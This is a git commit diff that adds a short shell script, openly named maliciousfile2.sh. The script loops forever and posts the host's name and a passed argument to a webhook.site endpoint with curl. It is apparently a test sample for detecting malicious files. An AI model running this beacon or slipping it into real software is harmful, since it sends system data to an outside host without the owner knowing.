9c853da020e8b5f9d23e34b7d49add159142ebaa
Jasonrve <jasonrve@gmail.com>
2023-02-21 15:22:00 +0200

    Update and rename maliciousfi.sh to maliciousfile2.sh

---
+++ maliciousfile2.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+
+while true; do
+  echo "Doing something malicious..."
+  echo "executing on $HOSTNAME"
+  curl -X POST https://webhook.site/4a160954-e93b-4b75-b0c7-879ea53d1265 -H "Content-Type: application/json" -d '{"Hostname": '$HOSTNAME', "NotClientData": '$1'}'  
+  sleep 5
+done
